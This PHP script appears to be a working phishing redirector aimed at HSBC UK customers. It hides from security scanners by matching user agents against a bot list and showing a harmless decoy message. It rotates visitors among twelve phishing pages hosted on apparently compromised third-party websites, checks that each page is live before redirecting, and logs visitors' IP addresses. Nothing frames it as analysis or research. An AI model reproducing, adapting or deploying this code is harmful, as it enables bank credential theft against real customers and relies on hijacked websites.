<?php
    $lines = file('bots.txt');
    $userAgent = $_SERVER['HTTP_USER_AGENT'];
    if (in_array($userAgent, $lines))
    {
	    die('This is my new website, more to come soon!');
    }
    $m = $_GET['login'];
restart: 
$redirect_url[1] = "http://cakejittra.com/wp-content/plugins/seo-ultimate/modules/more-links/hsbc-uk/" . $m;
$redirect_url[2] = "http://123immo.ch/hsbc-uk/" . $m;
$redirect_url[3] = "http://referatbar.germes.ru/joomla/administrator/components/com_menus/weblink_category_table/hsbc-uk/" . $m;
$redirect_url[4] = "http://daunhothanquoc.vn/application/views/admin/quangcao/wp_dir/hsbc-uk/" . $m;
$redirect_url[5] = "http://ermakovy.ru/wp-includes/js/tinymce/themes/modern/hsbc-uk/" . $m;
$redirect_url[6] = "http://blacksanbangalang.com/wp-content/themes/twentyfifteen/hsbc-uk/" . $m;
$redirect_url[7] = "http://planet-gardens.ru/manager/assets/modext/sections/context/hsbc-uk/" . $m;
$redirect_url[8] = "http://old.thproekt.ru/assets/images/gonieeciw/hsbc-uk/" . $m;
$redirect_url[9] = "http://trans.dandach.ru/tpl/images/projects/hsbc-uk/" . $m;
$redirect_url[10] = "http://ev-consult.ru/cg-bn/microsoft/b815dc7181e042ca798dfae9ef01dbce/hsbc-uk/" . $m;
$redirect_url[11] = "http://faikkarahancigida.com/admin/_/media/hsbc-uk/" . $m;
$redirect_url[12] = "http://n5gumi.org/n5gumi_tn6/data/group/hsbc-uk/" . $m;
$randomurl = rand(1,12);
$result = file_get_contents($redirect_url[$randomurl]);
if (strpos($result, 'IB1234567890')) {
echo "<html><meta http-equiv='refresh' content='0;url=". $redirect_url[$randomurl]. "' /><body>";
}
else
{
    goto restart;
}

$ip = getenv("REMOTE_ADDR");
$file = fopen("ip.txt", "a");
fwrite($file,$ip."  -  ".gmdate("Y-n-d")." @ ".gmdate("H:i:s")."\n");
?>
